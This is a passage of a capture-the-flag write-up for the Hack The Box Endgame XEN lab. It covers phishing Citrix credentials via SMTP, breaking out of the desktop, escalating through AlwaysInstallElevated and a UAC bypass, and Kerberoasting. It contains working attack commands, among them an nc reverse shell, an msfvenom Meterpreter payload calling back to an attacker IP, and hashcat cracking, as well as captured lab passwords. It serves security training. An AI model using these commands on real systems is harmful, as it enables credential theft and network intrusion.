# HTB Endgame: XEN

[endgame](/tags#endgame ) [ctf](/tags#ctf ) [hackthebox](/tags#hackthebox )
[htb-xen](/tags#htb-xen ) [nmap](/tags#nmap ) [iis](/tags#iis )
[citrix](/tags#citrix ) [xenapp](/tags#xenapp ) [smtp](/tags#smtp ) [smtp-
user-enum](/tags#smtp-user-enum ) [phishing](/tags#phishing )
[swaks](/tags#swaks ) [escape](/tags#escape )
[alwaysinstallelevated](/tags#alwaysinstallelevated ) [powerup](/tags#powerup
) [uac-bypass](/tags#uac-bypass ) [msfvenom](/tags#msfvenom )
[metasploit](/tags#metasploit ) [tunnel](/tags#tunnel )
[kerberoast](/tags#kerberoast ) [getuserspns](/tags#getuserspns )
[hashcat](/tags#hashcat ) [powerview](/tags#powerview )
[crackmapexec](/tags#crackmapexec ) [password-spray](/tags#password-spray )
[ppk](/tags#ppk ) [puttygen](/tags#puttygen ) [proxychains](/tags#proxychains
) [ssh](/tags#ssh ) [kwprocessor](/tags#kwprocessor ) [keyboard-
walks](/tags#keyboard-walks ) [netscaler](/tags#netscaler )
[tcpdump](/tags#tcpdump ) [packet-capture](/tags#packet-capture )
[scp](/tags#scp ) [ssh](/tags#ssh ) [wireshark](/tags#wireshark )
[ldap](/tags#ldap ) [bloodhound](/tags#bloodhound )
[sharphound](/tags#sharphound ) [xfreerdp](/tags#xfreerdp )
[winrm](/tags#winrm ) [evil-winrm](/tags#evil-winrm )
[sebackupprivilege](/tags#sebackupprivilege ) [ntds](/tags#ntds )
[diskshadow](/tags#diskshadow ) [secretsdump](/tags#secretsdump )
[wmiexec](/tags#wmiexec ) [copy-filesebackupprivilege](/tags#copy-
filesebackupprivilege ) [active-directory](/tags#active-directory )  
  
Jun 17, 2020

HTB Endgame: XEN

![](https://0xdfimages.gitlab.io/img/endgame-xen-cover.png)

Endgame XEN is all about owning a small network behind a Citrix virtual
desktop environment. I’ll phish creds for the Citrix instance from users in
the sales department, and then use them to get a foothold. I’ll break out of
the restrictions in that environment, and then get administrator access. From
there I’ll pivot into the domain, finding a Kerberoastable user and breaking
the hash to get access to an SMB share with an encrypted SSH key. I’ll break
that, and get access to the NetScaler device, where I’ll capture network
traffic to find service creds in LDAP traffic. I’ll spray those creds against
the domain to find they also work for a backup service, which I’ll use to
access the DC, and to exfil the Active Directory database, where I can find
the domain administrator hash.

## Lab Details

Name: | [Endgame XEN](https://www.hackthebox.eu/home/endgame/view/2)  
---|---  
Release Date: | [11 May 2019](https://twitter.com/hackthebox_eu/status/1126754101327327232)  
Retire Date: | [16 June 2020](https://twitter.com/hackthebox_eu/status/1271474500727640064)  
Creators: | [![egre55](https://www.hackthebox.com/badge/image/1190) egre55](https://app.hackthebox.com/users/1190)  
  
Hosts: | 

  * XEN-DC ![Windows](../img/.png)Windows
  * XEN-Citrix ![Windows](../img/.png)Windows
  * XEN-NetScaler ![FreeBSD](../img/.png)FreeBSD
  * XEN-vDesktop1 ![Windows](../img/.png)Windows
  * XEN-vDesktop2 ![Windows](../img/.png)Windows
  * XEN-vDesktop3 ![Windows](../img/.png)Windows

  
Description: | Humongous Retail operates a nationwide chain of stores.  
  
The company has reacted to several recent skimming incidents by investing
heavily in their POS systems. Keen to avoid any further negative publicity,
they have engaged the services of a penetration testing company to assess the
security of their perimeter and internal infrastructure.  
  
Xen is designed to put your skills in enumeration, breakout, lateral movement,
and privilege escalation to the test within a small Active Directory
environment.  
  
The goal is to gain a foothold on the internal network, escalate privileges
and ultimately compromise the domain while collecting several flags along the
way.  
  
## Breach

### nmap

`nmap` finds three open TCP ports on the target IP, SMTP (25), HTTP (80) and
HTTPS (443):

    
    
    root@kali# nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.13.38.12
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 08:59 EDT
    Nmap scan report for 10.13.38.12
    Host is up (0.048s latency).
    Not shown: 65532 filtered ports
    PORT    STATE SERVICE
    25/tcp  open  smtp
    80/tcp  open  http
    443/tcp open  https
    
    Nmap done: 1 IP address (1 host up) scanned in 30.51 seconds
    root@kali# nmap -sV -sC -p 25,80,443 -oA scans/nmap-tcpscripts 10.13.38.12
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 09:00 EDT
    Nmap scan report for 10.13.38.12
    Host is up (0.035s latency).
    
    PORT    STATE SERVICE    VERSION
    25/tcp  open  smtp
    | fingerprint-strings:
    |   GenericLines, GetRequest:
    |     220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
    |     sequence of commands
    |     sequence of commands
    |   Hello:
    |     220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
    |     EHLO Invalid domain address.
    |   Help:
    |     220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
    |     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
    |   NULL:
    |_    220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
    | smtp-commands: CITRIX, SIZE 20480000, AUTH LOGIN, HELP,
    |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
    80/tcp  open  http       Microsoft IIS httpd 7.5
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: Did not follow redirect to https://humongousretail.com/
    443/tcp open  ssl/https?
    |_ssl-date: 2019-05-11T12:58:14+00:00; -3m18s from scanner time.
    | sslv2:
    |   SSLv2 supported
    |   ciphers:
    |     SSL2_RC4_128_WITH_MD5
    |_    SSL2_DES_192_EDE3_CBC_WITH_MD5
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port25-TCP:V=7.70%I=7%D=5/11%Time=5CD6C792%P=x86_64-pc-linux-gnu%r(NULL
    SF:,33,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x20\(EXCHANGE\.HTB\.LOCAL
    SF:\)\r\n")%r(Hello,55,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x20\(EXCH
    SF:ANGE\.HTB\.LOCAL\)\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n
    SF:")%r(Help,6F,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x20\(EXCHANGE\.H
    SF:TB\.LOCAL\)\r\n211\x20DATA\x20HELO\x20EHLO\x20MAIL\x20NOOP\x20QUIT\x20R
    SF:CPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")%r(GenericLines,6F,"220\x20ESM
    SF:TP\x20MAIL\x20Service\x20ready\x20\(EXCHANGE\.HTB\.LOCAL\)\r\n503\x20Ba
    SF:d\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comm
    SF:ands\r\n")%r(GetRequest,6F,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x2
    SF:0\(EXCHANGE\.HTB\.LOCAL\)\r\n503\x20Bad\x20sequence\x20of\x20commands\r
    SF:\n503\x20Bad\x20sequence\x20of\x20commands\r\n");
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: -3m18s, deviation: 0s, median: -3m18s
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 122.99 seconds
    

SMTP scripts are identifying the hostname as EXCHANGE.HTB.LOCAL. Based on the
[IIS
version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions),
this looks like Windows 10 / Server 2016 / Servier 2019.

### Website - TCP 80 / 443

#### Site

Visiting `http://10.13.38.12` redirects to `https://humongousretail.com/`:

    
    
    HTTP/1.1 301 Moved Permanently
    Content-Type: text/html; charset=UTF-8
    Location: https://humongousretail.com/
    Server: Microsoft-IIS/7.5
    X-Powered-By: ASP.NET
    Date: Sat, 11 May 2019 13:02:53 GMT
    Connection: close
    Content-Length: 151
    
    <head><title>Document Moved</title></head>
    <body><h1>Object Moved</h1>This document may be found <a HREF="https://humongousretail.com/">here</a></body>
    

After adding to my hosts file, I get a site:

[ ![](https://0xdfimages.gitlab.io/img/image-20200616151633529.png)
](https://0xdfimages.gitlab.io/img/image-20200616151633529.png)

[_Click for full
image_](https://0xdfimages.gitlab.io/img/image-20200616151633529.png)

Both the HTTP and HTTPS sites seem to be the same content. There isn’t too
much interesting on the site itself, other than a contact email address at the
very bottom, `jointheteam@humongousretail.com`.

#### Directory Brute Force

Running `gobuster` (old syntax, would now be `gobuster dir -k -u ...`)
provides some standard paths like `images`, `css`, and `js`, but also
`/remote`:

    
    
    root@kali# gobuster -k -u https://humongousretail.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o scans/gobuster-humongousretail-small -t 30                    
    
    =====================================================
    Gobuster v2.0.1              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : https://humongousretail.com/
    [+] Threads      : 30
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Timeout      : 10s
    =====================================================
    2019/05/11 09:20:16 Starting gobuster
    =====================================================
    /images (Status: 301)
    /Images (Status: 301)
    /css (Status: 301)
    /js (Status: 301)
    /remote (Status: 301)
    /IMAGES (Status: 301)
    /CSS (Status: 301)
    /JS (Status: 301)
    /Remote (Status: 301)
    =====================================================
    2019/05/11 09:25:29 Finished
    =====================================================
    

#### /remote

`/remote` returns a Citrix logon screen:

![1557582383932](https://0xdfimages.gitlab.io/img/1557582383932.png)

I tried some basic creds, but was not able to log in.

### SMTP - TCP 25

At this point I’ll pivot to SMTP. The first thing I can try is to enumerate
users in the domain using the `smtp-user-enum` tool, which can be found
[here](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum), or
installed on kali with `apt install smtp-user-enum`.

I’ll run it with a wordlist*, the domain humongousretail.com (which matches
the email address from the webpage), the `RECP TO` method returns users:

    
    
    root@kali# smtp-user-enum -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -D humongousretail.com -t 10.13.38.12 -m 50 -M RCPT
    Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
    
     ----------------------------------------------------------
    |                   Scan Information                       |
     ----------------------------------------------------------
    
    Mode ..................... RCPT
    Worker Processes ......... 50
    Usernames file ........... /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
    Target count ............. 1
    Username count ........... 21168
    Target TCP port .......... 25
    Query timeout ............ 5 secs
    Target domain ............ humongousretail.com
    
    ######## Scan started at Sat May 11 10:59:18 2019 #########
    10.13.38.12: it@humongousretail.com exists
    10.13.38.12: legal@humongousretail.com exists
    10.13.38.12: marketing@humongousretail.com exists
    10.13.38.12: sales@humongousretail.com exists
    ######## Scan completed at Sat May 11 11:06:51 2019 #########
    4 results.
    
    21168 queries in 453 seconds (46.7 queries / sec)
    

_* I would think I would pick a wordlist from SecLists, but my notes only
show`names.txt`… a wordlist from SecLists Usernames that does hit on these
results is in `Usernames/Honeypot-Captures/multiplesources-users-fabian-
fingerle.de.txt`. It’s also possible I used Discovery/web-contents/big.txt,
which would be a bit strange for enumerating user accounts, but does have all
four accounts._

Now I have five email addresses.

### Phishing for Creds

I’ll use the emails that I have to try to phish credentials for the Citrix
login. It took me a while to compose an email that resulted in a hit. The
following criteria seemed to work for me:

  * To `sales@humongousretail.com`
  * From `it@humongousretail.com`
  * “citrix” in the body of the message
  * url in the body of the message

I used `swaks` to send an email just to see if someone would click on a link:

    
    
    root@kali# swaks --to sales@humongousretail.com --from it@humongousretail.com --header "Subject: Credentials / Errors" --body "citrix http://10.14.15.41/" --server humongousretail.com
    ...[snip]...
    

With Python web server listening on port 80, I was quite surprised when a few
seconds later I got POST request back:

    
    
    root@kali# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.13.38.12 - - [11/May/2019 09:13:08] code 501, message Unsupported method ('POST')
    10.13.38.12 - - [11/May/2019 09:13:08] "POST /remote/auth/login.aspx?LoginType=Explicit&user=pmorgan&password=Summer1Summer!&domain=HTB.LOCAL HTTP/1.1" 501 - 
    

To see the full request, I killed Python and started `nc`:

    
    
    root@kali# nc -lnvp 80
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::80
    Ncat: Listening on 0.0.0.0:80
    Ncat: Connection from 10.13.38.12.
    Ncat: Connection from 10.13.38.12:50123.
    POST /remote/auth/login.aspx?LoginType=Explicit&user=awardel&password=@M3m3ntoM0ri@&domain=HTB.LOCAL HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
    Host: 10.14.15.41
    Content-Length: 75
    Expect: 100-continue
    Connection: Keep-Alive
    
    LoginType=Explicit&user=awardel&password=%40M3m3ntoM0ri%40&domain=HTB.LOCAL
    

I also noted that there were different creds. After sending a handful of
times, I collected the following credentials:

  * jmendes / VivaBARC3L0N@!!!
  * awardel / @M3m3ntoM0ri
  * pmorgan / Summer1Summer!

I believe the intention here was to set up a full phishing campaign where I
clone the citrix login, and send sales an email that we’re testing a new
Citrix url, and then use that to get their creds. I suspect the automation
kind of shortcutted that directly to the POST with the creds.

I also believe that the three sets of creds are just because only one user can
be logged into Citrix at a time, so this was to lessen the odds of a HTB
player bumping someone else out of the desktop.

### Configure Citrix

When I first visit the site, it actually has a prompt to install Citrix:

![image-20200616165348833](https://0xdfimages.gitlab.io/img/image-20200616165348833.png)

When I used those prompts, it didn’t work well for me. This might be because
it gives the 32-bit package. Either way, I was able to get the 64-bit tarball
package from [here](https://www.citrix.com/en-gb/downloads/citrix-
receiver/linux/receiver-for-linux-latest.html), and install with the following
commands:

    
    
    root@kali# rm -rf temp/; mkdir temp/
    root@kali# tar xf linuxx64-13.10.0.20.tar.gz -C temp/
    root@kali# cd temp/
    root@kali# ls
    linuxx64  nls  PkgId  setupwfc
    root@kali# ./setupwfc
    Citrix Receiver for Linux 13.10.0 setup.
    ...[snip]...
    Select a setup option:
    
     1. Install Citrix Receiver for Linux 13.10.0
     2. Remove Citrix Receiver for Linux 13.10.0
     3. Quit Citrix Receiver for Linux 13.10.0 setup
    
    Enter option number 1-3 [1]: 1
    
    Please enter the directory in which Citrix Receiver for Linux is to be installed.
    [default /opt/Citrix/ICAClient]
    or type "quit" to abandon the installation:
    
    The parent directory /opt/Citrix does not exist.
    Do you want to create it? [default y]:
    
    You have chosen to install Citrix Receiver for Linux 13.10.0 in /opt/Citrix/ICAClient.
    
    Proceed with installation? [default n]: y
    
    Installation proceeding...
    
    Checking available disk space ...
    
            Disk space available 50140072 K
            Disk space required 51234 K
    
    
    Continuing ...
    Creating directory /opt/Citrix/ICAClient
    Core package...
    Setting file permissions...
    Integrating with browsers...
    Browsers found.
    
    Found entries in browser configuration(s) from an earlier installation.
    Do you want these entries to point to the new installation? [default y]:
    
    Integration complete.
    Do you want GStreamer to use the plugin from this client? [default y]:
    Do you want to install USB support? [default n]: y
    
    
    Select a setup option:
    
     1. Install Citrix Receiver for Linux 13.10.0
     2. Remove Citrix Receiver for Linux 13.10.0
     3. Quit Citrix Receiver for Linux 13.10.0 setup
    
    Enter option number 1-3 [3]: 3
    Quitting Citrix Receiver for Linux 13.10.0 setup.
    

### Get Desktop

Now I’ll go back and enter creds for one of the accounts:

![1557582861291](https://0xdfimages.gitlab.io/img/1557582861291.png)

On hitting “Log On”, it shows a single desktop. Clicking on it downloads an
`.ica` file, which my system now offers the Citrix Receiver Engine as the
program to handle it:

![1557582877718](https://0xdfimages.gitlab.io/img/1557582877718.png)

On clicking ok, I’m at a Windows desktop with nothing on it. Going into
Explorer, I can see there’s actually a `flag.txt` on the desktop, and it
contains the first flag:

[![desktop with
flag](https://0xdfimages.gitlab.io/img/1557582966301.png)_Click for full size
image_](https://0xdfimages.gitlab.io/img/1557582966301.png)

**Breach: XEN{wh0_n33d5_2f@?}**

## Deploy

### Restricted Environment Bypass

#### Restrictions

The first thing I wanted to do was get to a shell, but it quickly becomes
clear that I’m in a restricted environment. I can’t find `cmd.exe` or
`powershell.exe` in the start menu. If I try to visit `c:\windows\system32` in
Explorer, I get an error:

![image-20200616171333484](https://0xdfimages.gitlab.io/img/image-20200616171333484.png)

I tried to access files from my local host by starting an SMB server with
`smbserver.py share .`. When I try to access it in Explorer, the creds are
actually sent to `smbserver.py`, but then Explorer blocks me:

![image-20200616172355013](https://0xdfimages.gitlab.io/img/image-20200616172355013.png)

#### bat File

The simplest way I know of to get past this kind of restriction is to use a
`.bat` file. `notepad.exe` isn’t available from the Start Menu, but I can
right-click and create a text file in the user’s documents. Then I can double
click it, and it opens in Notepad.

I’ll enter the text `cmd.exe`, and save it as `cmd.bat` (making sure to change
the Save as type to “All files” so it doesn’t append `.txt` to the end of the
file name).

![image-20200616172918977](https://0xdfimages.gitlab.io/img/image-20200616172918977.png)

Double-clicking on `cmd.bat` launches `cmd.exe`:

![image-20200616173018799](https://0xdfimages.gitlab.io/img/image-20200616173018799.png)

#### nc Shell

Next I got a quick `nc` remote shell, though I’ll end up using the GUI desktop
for many of the next steps. I’ll make sure there’s a copy of `nc64.exe` in the
share, and run it from the share:

![image-20200616173419135](https://0xdfimages.gitlab.io/img/image-20200616173419135.png)

At my listener, I get a shell:

    
    
    root@kali# rlwrap nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.13.38.15.
    Ncat: Connection from 10.13.38.15:50549.
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Users\pmorgan\Documents>
    

### Privesc to Administrator

I ran
[PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1),
and one of the things it identified was the Always Install Elevated key was
present and set. I can see this from my shell:

    
    
    C:\>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    
    HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1
    
    
    C:\>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    
    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1
    

To take advantage of this, I’ll run the function `Write-UserAddMSI` in
`PowerUp`. I’ll run it, and it tells me the name of the MSI it created:

![1557586889623](https://0xdfimages.gitlab.io/img/1557586889623.png)

I can now see the icon in Explorer:

![1557586898998](https://0xdfimages.gitlab.io/img/1557586898998.png)

Running it pops a prompt:

![1557587018111](https://0xdfimages.gitlab.io/img/1557587018111.png)

If I give it a password that doesn’t meet the password complexity, it will
throw an error. When I give it a good password, the new user is there:

![1557587849607](https://0xdfimages.gitlab.io/img/1557587849607.png)

Now I’ll use runas to get a shell as 0xdf:

![1557587828327](https://0xdfimages.gitlab.io/img/1557587828327.png)

A new `cmd.exe` shell opens.

### UAC Bypass

Even as 0xdf, I can’t access `\users\administrator`:

![image-20200616180334365](https://0xdfimages.gitlab.io/img/image-20200616180334365.png)

That’s because UAC has this shell running as low-priv:

![1557587868158](https://0xdfimages.gitlab.io/img/1557587868158.png)

Some Googling led to [this
exploit](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-
newer-Windows-versions.html) which breaks free from UAC ([this
one](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
also works). I’ll copy it over and compile it with PowerShell creating a
`.dll`. Then I’ll load that using reflection, and then call the `Execute`
function to start a new `cmd.exe`:

![1557588503599](https://0xdfimages.gitlab.io/img/1557588503599.png)

The resulting `cmd` that pops up has full admin privs:

![image-20200616181549415](https://0xdfimages.gitlab.io/img/image-20200616181549415.png)

Now I can access the administrator’s desktop, and find the next flag:

    
    
    C:\Users\Administrator\Desktop>type flag.txt
    XEN{7ru573d_1n574ll3r5}
    

**Deploy: XEN{7ru573d_1n574ll3r5}**

## Ghost

### Meterpreter

At this point, to continue into the network, I’ll use Metasploit to help
manage tunnels. It can certainly be done with something like
[Chisel](https://github.com/jpillora/chisel), but it’s just easier to use MSF,
and it’s not keeping me from learning anything. It is also much faster if I’m
competing with someone for the Citrix Desktop. I can log in, launch a shell,
run the MSF payload from my share, and I’m done with the session.

I’ll create a reverse shell payload:

    
    
    root@kali# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.15.41 LPORT=443 -f exe -o rev.51-443.exe
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 510 bytes
    Final size of exe file: 7168 bytes
    Saved as: rev.51-443.exe
    

With `exploit/multi/handler` running, I’ll run it in my initial shell as the
basic user:

![image-20200616222411779](https://0xdfimages.gitlab.io/img/image-20200616222411779.png)

The callback comes in MSF:

    
    
    msf5 exploit(multi/handler) > run
    
    [*] Started reverse TCP handler on 10.14.15.41:443 
    [*] Sending stage (201283 bytes) to 10.13.38.15
    [*] Meterpreter session 1 opened (10.14.15.41:443 -> 10.13.38.15:50715) at 2020-06-16 22:22:17 -0400
    
    meterpreter > 
    

To get SYSTEM access, I’ll background this session, and use
`exploit/windows/local/always_install_elevated`:

    
    
    msf5 exploit(windows/local/always_install_elevated) > run
    
    [*] Started reverse TCP handler on 10.14.15.41:443 
    [*] Uploading the MSI to C:\Users\pmorgan\AppData\Local\Temp\JOrCzGeQ.msi ...
    [*] Executing MSI...
    [*] Sending stage (176195 bytes) to 10.13.38.15
    [*] Meterpreter session 2 opened (10.14.15.41:443 -> 10.13.38.15:50717) at 2020-06-16 22:25:57 -0400
    
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    

### Kerberoast

#### Get DC IP

Now that I have access to the domain, I want to try Kerberoasting to gather
additional credentials. I’ll need the DC’s IP address. I guessed that the name
might be DC, and `ping` gives it’s IP address:

    
    
    C:\Windows\system32>ping -n 1 dc
    ping -n 1 dc
    
    Pinging DC.htb.local [172.16.249.200] with 32 bytes of data:
    Reply from 172.16.249.200: bytes=32 time<1ms TTL=128
    
    Ping statistics for 172.16.249.200:
        Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
    Approximate round trip times in milli-seconds:
        Minimum = 0ms, Maximum = 0ms, Average = 0ms
    

#### Create Proxy

I’ll now create a proxy through the meterpreter session so that I can connect
directly to the DC from my host. I’ll need to run two commands. First, I’ll
use `post/multi/manage/autoroute` to tell MSF that it should route traffic to
172.16.249.0/24 through session 2.

    
    
    msf5 post(multi/manage/autoroute) > options       
                   
    Module options (post/multi/manage/autoroute):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)    
       NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
       SESSION  2                yes       The session to run this module on.
       SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)        
                    
    msf5 post(multi/manage/autoroute) > run            
                                                                                      
    [!] SESSION may not be compatible with this module.
    [*] Running module against VDESKTOP3
    [*] Searching for subnets to autoroute.
    [+] Route added to subnet 10.13.38.0/255.255.255.0 from host's routing table.
    [+] Route added to subnet 172.16.249.0/255.255.255.0 from host's routing table.
    [*] Post module execution completed 
    

Now I’ll start the proxy using `auxiliary/server/socks4a`:

    
    
    msf5 auxiliary(server/socks4a) > options 
    
    Module options (auxiliary/server/socks4a):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SRVHOST  0.0.0.0          yes       The address to listen on
       SRVPORT  1080             yes       The port to listen on.
    
    
    Auxiliary action:
    
       Name   Description
       ----   -----------
       Proxy                               
    
    
    msf5 auxiliary(server/socks4a) > run
    [*] Auxiliary module running as background job 0.
    
    [*] Starting the socks4a proxy server
    

Now I can use `proxychains` to tunnel into the Xen network.

#### Roasting

I’ll use `GetUserSPNs.py` to Kerberoast, and it returns a hash for mturner:

    
    
    root@kali# proxychains GetUserSPNs.py -request -dc-ip 172.16.249.200 HTB.LOCAL/pmorgan:Summer1Summer! -save -outputfile GetUserSPNs.out                                                                                   
    ProxyChains-3.1 (http://proxychains.sf.net)
    Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
    
    ServicePrincipalName                Name     MemberOf                                 PasswordLastSet      LastLogon
    ----------------------------------  -------  ---------------------------------------  -------------------  -------------------
    MSSQLSvc/CITRIXTEST.HTB.LOCAL:1433  mturner  CN=Deployment,OU=Groups,DC=htb,DC=local  2019-02-13 17:23:48  2019-04-10 16:14:57
    
    root@kali# cat GetUserSPNs.out
    $krb5tgs$23$*mturner$HTB.LOCAL$MSSQLSvc/CITRIXTEST.HTB.LOCAL~1433*$2c25cd994272360eeee9720fcf70b88e$f42d18b44f7bf2e242285f39370da356c9784f4ec96123b5d47766caebb6f0dae5350b58df4cd2c53c2c6671b7d5d425937656e01670134ee858d21b1515121adb29ba6de2fabab4f3ff139369136d3772e11d34c4979a0b5c3f65ff9648b26621d915352fead31a93e2dd01f92f1d329aef924e5969159cde84b764e4b45d01f162a92b667080983ed636f7a154fe4e63255e3d50b33c0fb8b95f0cd70f1bea102c0affcb89ba987bd5a9316a9c3254c93fabf71e584f5eaa726f3a7922b97b47e2bb16f8fb0bb2e73293d3f664e4e85bd3c6b995d13e5df3a1406a9395f7b02777e27ccd433f0fc0d006740ab92d9c13d6f0e91083b764b233783fbe490de230ec13d1c1ab1c63ecfc0248e4bca5050f7706d17ee827caf8377dc70c9df35cb81901542778f7c56aedd7f6491fb1c4e5f47990b95d2999e8df1e884be2023c0289a00f8a68bb12767f85dd958c2b2ae97cd7a5599503b064d7a5074c4932d443a141421941ba4193c08337dc95632d4e88282a6e789925bd4709e00f91420c18e8b6ac0b1bf6798fa719dd863c52b00631c4eedeb9718710f6c14625dd9b4ed71b7a3c09e7c353d44f215f496f2bab37f220e4f60637d5331360e13dcc216d990d1ae80705a8ec053427ab179b5160cdc1b39a26c4700b69c66fd11b53b6e942d0abf54d96f61eb5715c4f58a1246fa86f4a232f36d6989d783909bc28bfd8b836d6250a9f1a5350046a004a452da54d7c48e73998e0a2b457dac1f5687c70441974a27391bb9e31ea4510de4c32ef76a4287ae4929da9ff77cd1c18df4bee33115f356e2df9cee980e38ee644b4f1b9a7da38df0c9bb37d6c9f9fc4d79f407f8919c6b8d9fcba2779f8b91231a8aca7ae7b82e20341f5e5ac29f601d1e112c082128cd8a7be031b2279460833d4b03c2d4018bd1be0ca7b6578933c9142e653e2a931ab56516de8f1fd66a46f6834aa15aa4e4213265011cf7911325a281694b1f5fe040c13d1cc076efa27657deac7661a0455e86f78d5473b63324a1a10247ace4c64a4f37f17c6c671e9a97d4559a1a432aeea2275d7ea803e255add1daae32105c0337da391486157adb645d2faf0a138f63b0a1d7d739d11cbb53013ababb1cbf8d11c71bc143abf200466288197a6714d76ca0e538c25c8563e00acaa020033e3800d0c46cffc164a7a7bdc7851edcc08971328a59f3830158b9146027ccbe4d41df15f5834eff7dded87c4fd40b9aaf287a0d1a8c06cf71c82981ae6832a04ec30499570fb5842416a3202521095d9f337d7bfb1805ba18b7bd50396
    

### Crack Hash

My first attempts to crack the hash failed. After trying a few wordlists, I
tried applying some rule files, and it broke:

    
    
    root@kali# hashcat -a 0 -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule --force
    
    $krb5tgs$23$*mturner$HTB.LOCAL$MSSQLSvc/CITRIXTEST.HTB.LOCAL~1433*$2c25cd994272360eeee9720fcf70b88e$f42d18b44f7bf2e242285f39370da356c9784f4ec96123b5d47766caebb6f0dae5350b58df4cd2c53c2c6671b7d5d425937656e01670134ee858d21b1515121adb29ba6de2fabab4f3ff139369136d3772e11d34c4979a0b5c3f65ff9648b26621d915352fead31a93e2dd01f92f1d329aef924e5969159cde84b764e4b45d01f162a92b667080983ed636f7a154fe4e63255e3d50b33c0fb8b95f0cd70f1bea102c0affcb89ba987bd5a9316a9c3254c93fabf71e584f5eaa726f3a7922b97b47e2bb16f8fb0bb2e73293d3f664e4e85bd3c6b995d13e5df3a1406a9395f7b02777e27ccd433f0fc0d006740ab92d9c13d6f0e91083b764b233783fbe490de230ec13d1c1ab1c63ecfc0248e4bca5050f7706d17ee827caf8377dc70c9df35cb81901542778f7c56aedd7f6491fb1c4e5f47990b95d2999e8df1e884be2023c0289a00f8a68bb12767f85dd958c2b2ae97cd7a5599503b064d7a5074c4932d443a141421941ba4193c08337dc95632d4e88282a6e789925bd4709e00f91420c18e8b6ac0b1bf6798fa719dd863c52b00631c4eedeb9718710f6c14625dd9b4ed71b7a3c09e7c353d44f215f496f2bab37f220e4f60637d5331360e13dcc216d990d1ae80705a8ec053427ab179b5160cdc1b39a26c4700b69c66fd11b53b6e942d0abf54d96f61eb5715c4f58a1246fa86f4a232f36d6989d783909bc28bfd8b836d6250a9f1a5350046a004a452da54d7c48e73998e0a2b457dac1f5687c70441974a27391bb9e31ea4510de4c32ef76a4287ae4929da9ff77cd1c18df4bee33115f356e2df9cee980e38ee644b4f1b9a7da38df0c9bb37d6c9f9fc4d79f407f8919c6b8d9fcba2779f8b91231a8aca7ae7b82e20341f5e5ac29f601d1e112c082128cd8a7be031b2279460833d4b03c2d4018bd1be0ca7b6578933c9142e653e2a931ab56516de8f1fd66a46f6834aa15aa4e4213265011cf7911325a281694b1f5fe040c13d1cc076efa27657deac7661a0455e86f78d5473b63324a1a10247ace4c64a4f